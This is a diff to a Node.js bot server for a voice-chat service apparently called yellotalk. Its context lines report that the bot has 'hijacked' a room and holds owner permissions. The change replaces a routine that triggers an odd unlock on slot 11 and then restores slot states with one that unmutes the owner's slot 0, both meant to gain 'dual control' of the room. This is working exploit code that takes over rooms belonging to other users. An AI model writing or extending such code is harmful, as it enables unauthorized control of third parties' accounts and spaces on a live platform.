@@ -1048,67 +1048,18 @@ app.post('/api/bot/start', async (req, res) => {
                   console.log('✅✅✅ ROOM HIJACKED! Bot has OWNER permissions!');
                   console.log('🔓 Can now lock/unlock speaker slots!');
 
-                  // SAVE-RESTORE SOLUTION: Remember state → Trigger weird action → Restore
-                  console.log('\n💾 Step 1: Waiting for initial speaker_changed event...');
+                  // Try unmuting position 0 (room owner slot) to enable dual control
+                  console.log('\n🔄 Triggering first action: unmute position 0 (room owner)...');
 
-                  // Wait for initial speaker_changed to populate botState.speakers
                   setTimeout(() => {
-                    // Save current speaker states
-                    const savedStates = botState.speakers.map(s => ({
-                      position: s.position,
-                      locked: s.locked,
-                      pin_name: s.pin_name,
-                      uuid: s.uuid
-                    }));
-
-                    console.log('📋 Saved current states:');
-                    savedStates.forEach(s => {
-                      const status = s.locked ? '🔒 LOCKED' : s.pin_name === 'Empty' ? '⭕ EMPTY' : `👤 ${s.pin_name}`;
-                      console.log(`   Slot ${s.position}: ${status}`);
-                    });
-
-                    console.log('\n🔥 Step 2: Triggering "first weird action" (unlock position 11)...');
-                    console.log('⚠️  This will lock all slots (expected behavior)');
-
-                    // Trigger the first action to enable dual control
-                    yellotalkSocket.emit('unlock_speaker', {
+                    yellotalkSocket.emit('unmute_speaker', {
                       room: roomId,
-                      position: 11
-                    }, (weirdResp) => {
-                      console.log('📥 unlock_speaker position 11 response:', weirdResp);
-
-                      // Wait for speaker_changed event to reflect the locks
-                      setTimeout(() => {
-                        console.log('\n🔧 Step 3: Restoring original unlocked slots...');
-
-                        let restoreCount = 0;
-                        savedStates.forEach((saved, index) => {
-                          const current = botState.speakers[index];
-
-                          // If slot got locked but was originally empty/unlocked
-                          if (current?.locked && !saved.locked) {
-                            restoreCount++;
-                            console.log(`   🔓 Restoring slot ${index} (was ${saved.pin_name})...`);
-
-                            // Restore with small delays to avoid flooding
-                            setTimeout(() => {
-                              unlockSpeaker(index).catch(err =>
-                                console.log(`      ❌ Failed to restore slot ${index}:`, err.message)
-                              );
-                            }, index * 100);
-                          }
-                        });
-
-                        if (restoreCount === 0) {
-                          console.log('   ✅ No slots needed restoration');
-                        } else {
-                          console.log(`   🔄 Restoring ${restoreCount} slots...`);
-                        }
-
-                        console.log('\n✅✅✅ DUAL CONTROL ENABLED! Both bot and owner can control slots.');
-                      }, 1500); // Wait for speaker_changed after weird action
+                      position: 0  // Room owner slot
+                    }, (unmuteResp) => {
+                      console.log('📥 unmute_speaker position 0 response:', unmuteResp);
+                      console.log('✅ First action triggered - dual control should now be enabled');
                     });
-                  }, 2000); // Wait for initial speaker_changed to populate state
+                  }, 1500); // Wait after initial speaker_changed
 
                   io.emit('room-hijacked', { success: true });
                 } else {
